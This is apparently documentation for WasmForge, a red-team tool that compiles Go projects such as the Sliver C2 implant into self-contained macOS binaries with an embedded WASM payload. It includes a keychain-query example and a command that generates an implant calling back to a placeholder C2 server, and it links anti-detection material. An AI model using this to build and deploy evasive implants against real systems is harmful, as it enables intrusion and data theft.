# Compiling for macOS (Apple Targets)

WasmForge fully supports macOS targets. Unlike Windows (which requires `--win32-apis`), the macOS framework bridge is auto-enabled when `GOOS=darwin` is set — no extra flags required.

## Quick Start

```bash
# Build wasmforge
go build -o wasmforge ./cmd/wasmforge

# Compile a Go project for macOS (Intel)
GOOS=darwin GOARCH=amd64 ./wasmforge build -o myapp /path/to/project

# Compile a Go project for macOS (Apple Silicon)
GOOS=darwin GOARCH=arm64 ./wasmforge build -o myapp /path/to/project

# Build and run in one step
GOOS=darwin GOARCH=amd64 ./wasmforge run /path/to/project
```

Output is a single Mach-O binary with the WASM payload embedded — no external dependencies, no .NET/Go runtime required on the target.

## macOS Framework Bridge

Full macOS framework access from WASM guests via `dlopen` / `dlsym`. Load any framework (Security, CoreGraphics, IOKit, etc.) and call its functions with automatic WASM-to-host pointer translation.

```go
import "github.com/praetorian-inc/wasmforge/guest/darwin"

fw, _ := darwin.LoadFramework("Security")
sym, _ := fw.GetSymbol("SecItemCopyMatching")
r, _ := sym.Call(queryDict, resultRef)
```

The darwin gateway is structurally identical to Win32's `SyscallN` bridge but dramatically simpler — no shadow memory, no COM mirroring. Just pointer translation plus `syscall.SyscallN`. Assembly trampolines (`ccall9`) handle SysV AMD64 ABI calling convention for C function pointers returned by `dlsym`. No CGO required.

## Purego / ObjC Sysshim

Go programs using [`ebitengine/purego`](https://github.com/ebitengine/purego) for native function calls and `purego/objc` for Objective-C runtime interaction compile transparently. WasmForge auto-detects `purego` in the guest's `go.mod` and injects a sysshim that routes everything through the darwin bridge.

**Core purego support:**

- `Dlopen`, `Dlsym`, `SyscallN`, `RegisterFunc`, `NewCallback` — all implemented via the darwin host functions

**Objective-C runtime support:**

- `GetClass`, `RegisterName`, `Send[T]`, `RegisterClass`, `NewIMP`, `NewBlock` — full Objective-C messaging and class registration

**`CallMasked` pointer translation:**

- Per-argument bitmask controls which arguments are WASM pointers (strings, buffers) vs host values (ObjC IDs, selectors)
- `RegisterFunc` builds the mask automatically from argument types

**Host-side block construction:**

- ObjC blocks are constructed in host memory (not WASM linear memory) via dedicated host functions, because `_Block_copy` dereferences pointers inside the layout struct

**Callback trampolines:**

- `NewCallback` creates real native C function pointers on the host via `purego.NewCallback`, connected to the WASM guest through a yield-based channel protocol

## Validated macOS Programs

| Program                                                          | Description                                          | Status                                                          |
| ---------------------------------------------------------------- | ---------------------------------------------------- | --------------------------------------------------------------- |
| **Sliver** (beacon)                                              | C2 framework                                         | `pwd`, `ls`, `download`, `mkdir`, `execute`                     |
| **Sliver** (session)                                             | C2 framework, interactive mode                       | `pwd`, `ls`, `download`, `mkdir`, `execute`, SOCKS5 proxy       |

## Building Sliver for macOS

See [BUILDING-SLIVER.md](./BUILDING-SLIVER.md) for a full step-by-step Sliver build walkthrough covering both Windows and macOS targets.

Short version:

```bash
# Generate Sliver source targeting macOS (from a running Sliver server)
# generate --os darwin --arch amd64 --http https://YOUR_C2:8443 --save /tmp/sliver-mac --skip-symbols

# Build with WasmForge
GOWORK=off GOOS=darwin GOARCH=amd64 ./wasmforge build -v -o /tmp/sliver-implant /tmp/sliver-darwin-src/
```

## What's Different vs Windows Targets

| Aspect                        | Windows                                          | macOS                                            |
| ----------------------------- | ------------------------------------------------ | ------------------------------------------------ |
| Platform API flag             | `--win32-apis` required                          | Auto-enabled from `GOOS=darwin`                  |
| Output format                 | PE (Windows executable)                          | Mach-O                                           |
| Code signing                  | Authenticode (`osslsigncode`) — auto by default  | Not currently supported                          |
| Pointer translation           | Shadow memory + COM vtable mirroring             | Direct pointer translation only                  |
| Framework access              | Win32 DLLs via `SyscallN`                        | macOS `.framework` bundles via `dlopen`/`dlsym`  |
| Architectures                 | `amd64`                                          | `amd64`, `arm64`                                 |

## Related Documentation

- [Main README](../README.md) — quick start and feature overview
- [BUILDING-SLIVER.md](./BUILDING-SLIVER.md) — full Sliver build walkthrough (Windows + macOS)
- [GHOST-PROFILES.md](./GHOST-PROFILES.md) — anti-detection symbol profiling
- [CSHARP.md](./CSHARP.md) — .NET project compilation (Windows-only)
